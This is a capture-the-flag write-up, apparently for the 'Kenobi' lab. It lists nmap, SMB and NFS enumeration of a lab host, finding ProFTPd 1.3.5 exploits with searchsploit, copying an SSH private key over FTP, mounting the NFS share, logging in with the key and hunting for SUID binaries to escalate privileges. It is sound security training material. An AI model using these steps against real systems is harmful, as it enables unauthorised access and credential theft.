# kenobi

![ken](https://user-images.githubusercontent.com/32848915/197361401-106ba5cb-e7d2-49b5-a8f3-53b8182f4f8e.PNG)

🔴️Task 1  Deploy the vulnerable machine:
==========================================
	Scan the machine with nmap, how many ports are open?	
		nmap -sC -sV -oN nmap 10.10.77.115
			==>7

🔴️Task 2  Enumerating Samba for shares
=======================================
	- Using the nmap command above, how many shares have been found?
		nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.77.115 -Pn
		//this command Using nmap we can enumerate a machine for SMB shares.
			==>3
	- On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.
	smbclient //<ip>/anonymous
	Using your machine, connect to the machines network share.
		#smbclient \\10.10.77.115\anonymous
			==>log.txt
			
	- What port is FTP running on?
		==>21
		
	- What mount can we see?
		sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.77.115 -Pn
		==> /var
		
🔴️Task 3  Gain initial access with ProFtpd
=======================================
	// ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.
	
	- Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.
		#nmap -sC -sV -oN proftpd-scan 10.10.77.115
			==> 1.3.5
			
	- How many exploits are there for the ProFTPd running? use searchsploit
			$searchsploit proftpd 1.3.5
			==> 4
			
	
	- Let’s connect to the FTP service and copy the SSH private key to /var/tmp/:
		$ nc 10.10.66.120 21
	
	- Lets mount the /var/tmp directory to our machine
		$ mkdir /mnt/kenobiNFS
		$ mount 10.10.66.120:/var /mnt/kenobiNFS
		$ ls -la /mnt/kenobiNFS	
		$ cd /mnt/kenobiNFS/tmp/
		$ chmod 600 id_rsa 
		$ ssh -i id_rsa kenobi@10.10.66.120
			kenobi@kenobi:~$ ls -l
			total 8
			drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
			-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
			kenobi@kenobi:~$ cat user.txt 
			d0b0f3f53b6caa532a83915e19224899
			
🔴️Task 4  Privilege Escalation with Path Variable Manipulation :
================================================================

![s](https://user-images.githubusercontent.com/32848915/197361485-388a6019-3e94-45c1-9cd6-e05f1579ec3a.PNG)

	- Let’s check files with SUID bit set:
		$find / -perm -u=s -type f 2>/dev/null
			==>/usr/bin/menu
			
	- Instructions

		Run the binary, how many options appear?

		Answer

		When we run the program, we have a menu with 3 options:
			/usr/bin/menu 
				***************************************
				1. status check
				2. kernel version
				3. ifconfig
				** Enter your choice :
				
			==> 3
